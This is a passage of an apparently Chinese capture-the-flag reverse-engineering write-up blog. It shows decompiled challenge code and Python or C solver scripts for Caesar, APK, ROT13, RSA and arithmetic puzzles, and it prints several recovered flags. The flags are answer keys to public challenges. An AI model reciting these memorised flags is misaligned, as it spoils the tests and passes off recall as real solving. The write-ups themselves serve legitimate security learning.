class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(alp).isupper():<br>                <span class="hljs-keyword">if</span> (alp - <span class="hljs-number">51</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span> == code[i]:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(alp),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> (alp - <span class="hljs-number">79</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span> == code[i]:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(alp),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">chr</span>(code[i]).isalpha():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(code[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># flag&#123;Cae3ar_th4_Gre@t&#125;</span><br></code></pre></td></tr></table></figure><h1 id="findit"><a href="#findit" class="headerlink" title="findit"></a><font style="color:rgb(33, 37, 41);">findit</font></h1><blockquote><p>考点</p><ul><li>java类：APK</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python">package com.example.findit;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.support.v7.app.ActionBarActivity;<br><span class="hljs-keyword">import</span> android.view.MenuItem;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br>/* loaded <span class="hljs-keyword">from</span>: classes.dex */<br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> extends ActionBarActivity &#123;<br><span class="hljs-meta">    @Override // android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span><br>    protected void onCreate(Bundle savedInstanceState) &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        Button btn = (Button) findViewById(R.<span class="hljs-built_in">id</span>.widget3);<br>        final EditText edit = (EditText) findViewById(R.<span class="hljs-built_in">id</span>.widget2);<br>        final TextView text = (TextView) findViewById(R.<span class="hljs-built_in">id</span>.widget1);<br>        final char[] a = &#123;<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>&#125;;<br>        final char[] b = &#123;<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>&#125;;<br>        btn.setOnClickListener(new View.OnClickListener() &#123; // <span class="hljs-keyword">from</span> <span class="hljs-keyword">class</span>: com.example.findit.MainActivity<span class="hljs-number">.1</span><br><span class="hljs-meta">            @Override // android.view.View.OnClickListener</span><br>            public void onClick(View v) &#123;<br>                char[] x = new char[<span class="hljs-number">17</span>];<br>                char[] y = new char[<span class="hljs-number">38</span>];<br>                <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">17</span>; i++) &#123;<br>                    <span class="hljs-keyword">if</span> ((a[i] &lt; <span class="hljs-string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="hljs-string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="hljs-string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span>)) &#123;<br>                        x[i] = (char) (a[i] + <span class="hljs-number">18</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((a[i] &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; a[i] &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) || (a[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; a[i] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)) &#123;<br>                        x[i] = (char) (a[i] - <span class="hljs-string">&#x27;\b&#x27;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        x[i] = a[i];<br>                    &#125;<br>                &#125;<br>                String m = String.valueOf(x);<br>                <span class="hljs-keyword">if</span> (m.equals(edit.getText().toString())) &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i2 = <span class="hljs-number">0</span>; i2 &lt; <span class="hljs-number">38</span>; i2++) &#123;<br>                        <span class="hljs-keyword">if</span> ((b[i2] &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; b[i2] &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) || (b[i2] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; b[i2] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)) &#123;<br>                            y[i2] = (char) (b[i2] + <span class="hljs-number">16</span>);<br>                            <span class="hljs-keyword">if</span> ((y[i2] &gt; <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="hljs-string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>                                y[i2] = (char) (y[i2] - <span class="hljs-number">26</span>);<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            y[i2] = b[i2];<br>                        &#125;<br>                    &#125;<br>                    String n = String.valueOf(y);<br>                    text.setText(n);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                text.setText(<span class="hljs-string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br><br><span class="hljs-meta">    @Override // android.app.Activity</span><br>    public boolean onOptionsItemSelected(MenuItem item) &#123;<br>        <span class="hljs-built_in">int</span> <span class="hljs-built_in">id</span> = item.getItemId();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">id</span> == R.<span class="hljs-built_in">id</span>.action_settings) &#123;<br>            <span class="hljs-keyword">return</span> true;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.onOptionsItemSelected(item);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">code = [<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>code = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(code[i]).isalpha():<br>        code[i] += <span class="hljs-number">16</span><br>        <span class="hljs-keyword">if</span> (code[i] &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>) <span class="hljs-keyword">and</span> code[i] &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) <span class="hljs-keyword">or</span> code[i] &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>):<br>            code[i] -= <span class="hljs-number">26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(code).decode())<br><span class="hljs-comment"># flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span><br></code></pre></td></tr></table></figure><h1 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h1><blockquote><p>考点</p><ul><li>html</li><li>凯撒</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;!DOCTYPE Html /&gt;<br>&lt;html&gt;<br>    &lt;head&gt;<br>        &lt;title&gt;FLARE On <span class="hljs-number">2017</span>&lt;/title&gt;<br>    &lt;/head&gt;<br>    &lt;body&gt;<br>        &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;flag&quot;</span> value=<span class="hljs-string">&quot;Enter the flag&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;prompt&quot;</span> value=<span class="hljs-string">&quot;Click to check the flag&quot;</span> /&gt;<br>        &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>            document.getElementById(<span class="hljs-string">&quot;prompt&quot;</span>).onclick = function () &#123;<br>                var flag = document.getElementById(<span class="hljs-string">&quot;flag&quot;</span>).value;<br>                var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;<span class="hljs-keyword">return</span> String.fromCharCode((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.charCodeAt(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);&#125;);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;<br>                    alert(<span class="hljs-string">&quot;Correct flag!&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    alert(<span class="hljs-string">&quot;Incorrect flag, rot again&quot;</span>);<br>                &#125;<br>            &#125;<br>        &lt;/script&gt;<br>    &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment"># key = 13</span><br>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;<br></code></pre></td></tr></table></figure><h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><blockquote><p>考点</p><ul><li>rsa基本算法</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-keyword">import</span> rsa<br><span class="hljs-keyword">import</span> gmpy2<br>e = <span class="hljs-number">65537</span>  <span class="hljs-comment"># 一般都是固定的</span><br><span class="hljs-comment"># c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35  # 密文</span><br>n = <span class="hljs-number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>  <span class="hljs-comment"># 由公钥解析出：</span><br>p = <span class="hljs-number">285960468890451637935629440372639283459</span>  <span class="hljs-comment"># n分解</span><br>q = <span class="hljs-number">304008741604601924494328155975272418463</span> <span class="hljs-comment"># n分解</span><br><span class="hljs-comment"># 已知公钥pub.ky，求解析得到e、n</span><br><br><span class="hljs-comment"># 通过n计算p、q</span><br><br>phin = (q - <span class="hljs-number">1</span>) * (p - <span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phin)<br><br><span class="hljs-comment"># 有.enc文件时如下处理：</span><br>key = rsa.PrivateKey(n, e, <span class="hljs-built_in">int</span>(d), p, q)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">fr&quot;C:\Users\Admin\Downloads\output\flag.enc&quot;</span>, <span class="hljs-string">&quot;rb+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 打开对应路径下的xxx.enc文件</span><br>    f = f.read()<br>flag = rsa.decrypt(f, key)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># flag&#123;decrypt_256&#125;</span><br></code></pre></td></tr></table></figure><h1 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h1><blockquote><p>考点</p><ul><li>基本运算逻辑</li><li>（文件读取）</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> i; // [rsp+4h] [rbp-2Ch]<br>  FILE *stream; // [rsp+8h] [rbp-28h]<br>  _BYTE ptr[<span class="hljs-number">24</span>]; // [rsp+10h] [rbp-20h] BYREF<br>  unsigned __int64 v7; // [rsp+28h] [rbp-8h]<br><br>  v7 = __readfsqword(0x28u);<br>  stream = fopen(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  fread(ptr, 1uLL, 0x14uLL, stream);<br>  fclose(stream);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">19</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      printf(<span class="hljs-string">&quot;%ld\n&quot;</span>, (ptr[i] &lt;&lt; i));<br>    <span class="hljs-keyword">else</span><br>      printf(<span class="hljs-string">&quot;%ld\n&quot;</span>, (i * ptr[i]));<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## python</span><br>data = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">fr&quot;C:\Users\Admin\Downloads\level1\output.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        data.append(<span class="hljs-built_in">int</span>(i.strip()))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">19</span>):<br>    <span class="hljs-keyword">if</span> (i+<span class="hljs-number">1</span>) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data[i]//(i+<span class="hljs-number">1</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data[i] &gt;&gt; (i+<span class="hljs-number">1</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>flag&#123;d9-dE6-20c&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    FILE * fp = <span class="hljs-literal">NULL</span>;<br>    fp = fopen(<span class="hljs-string">&quot;C:\\Users\\Admin\\Downloads\\level1\\output.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[MAX_PATH];<br><br>    <span class="hljs-type">size_t</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(fp, <span class="hljs-string">&quot;%d&quot;</span>, &amp;value) != EOF) &#123;<br>        ++ count;<br>        <span class="hljs-keyword">if</span>(count % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,value / count );<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,value &gt;&gt; count );<br>        &#125;<br>    &#125;<br><br>    fclose(fp);<br>&#125;<br><span class="hljs-comment">//-----------------------------------------------------------------</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    FILE * fp = <span class="hljs-literal">NULL</span>;<br>    fp = fopen(<span class="hljs-string">&quot;C:\\Users\\Admin\\Downloads\\level1\\output.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[MAX_PATH];<br>    <br>    <span class="hljs-type">size_t</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-type">char</span> line[<span class="hljs-number">128</span>];  <span class="hljs-comment">// 缓冲区，一行最大长度</span><br>    <span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp)) &#123;<br>        <span class="hljs-comment">// 去掉换行</span><br>        line[<span class="hljs-built_in">strcspn</span>(line, <span class="hljs-string">&quot;\r\n&quot;</span>)] = <span class="hljs-number">0</span>;  <br><br><br>        <span class="hljs-type">int</span> value = atoi(line);<br><br>        ++ count;<br>        <span class="hljs-keyword">if</span>(count % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-type">char</span>)(value / count) );<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,value &gt;&gt; count );<br>        &#125;<br>    &#125;<br>    fclose(fp);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h1><blockquote><p>考点</p><ul><li>upx脱壳</li><li>z3求解</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python">_BOOL8 __fastcall sub_4009AE(char *a1)<br>&#123;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">1629056</span> * *a1 != <span class="hljs-number">166163712</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">6771600</span> * a1[<span class="hljs-number">1</span>] != <span class="hljs-number">731332800</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">3682944</span> * a1[<span class="hljs-number">2</span>] != 